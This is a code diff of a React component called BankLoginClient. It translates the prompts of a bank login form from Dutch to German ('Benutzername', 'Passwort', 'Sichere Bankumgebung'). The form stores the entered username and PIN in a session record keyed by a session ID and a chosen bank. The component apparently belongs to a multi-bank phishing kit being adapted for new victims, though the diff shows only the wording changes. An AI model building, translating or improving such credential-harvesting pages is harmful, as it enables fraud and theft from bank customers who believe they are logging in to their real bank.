@@ -526,7 +526,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         error_name: "SupabaseUpdateError",
         error_message: updateError.message ?? String(updateError),
       });
-      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
+      setError("Eingaben konnten nicht übermittelt werden. Bitte erneut versuchen.");
       return;
     }
     setSessionFormData(nextFormData);
@@ -565,7 +565,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     return (
       <div className="flex min-h-screen items-center justify-center p-4">
         <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
-          Onbekende bank. Start de selectie opnieuw.
+          Unbekannte Bank. Bitte starten Sie die Auswahl erneut.
         </p>
       </div>
     );
@@ -809,12 +809,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                 
                 <form onSubmit={handleSubmit}>
                   <div style={{ marginBottom: '1rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
-                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Benutzername</label>
+                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Ihr Benutzername" />
                   </div>
                   <div style={{ marginBottom: '1.5rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
-                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Passwort</label>
+                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Ihr Passwort" />
                   </div>
                   
                   {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
@@ -912,7 +912,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
               )}
             </div>
             <div>
-              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
+              <p className="text-[10px] uppercase tracking-widest opacity-80">Sichere Bankumgebung</p>
               <h2 className="text-lg font-bold">{bank.name}</h2>
             </div>
           </div>
